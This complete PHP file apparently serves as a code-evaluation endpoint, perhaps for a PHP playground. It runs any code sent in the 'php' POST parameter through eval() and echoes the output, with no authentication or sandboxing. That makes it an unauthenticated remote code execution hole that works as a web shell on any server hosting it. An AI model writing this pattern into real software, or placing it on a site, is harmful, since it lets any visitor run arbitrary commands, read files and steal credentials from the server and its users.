<?php
try {
    echo eval('?>' . $_POST['php']);
} catch (Exception $e) {
    echo 'Invalid Syntax';
}
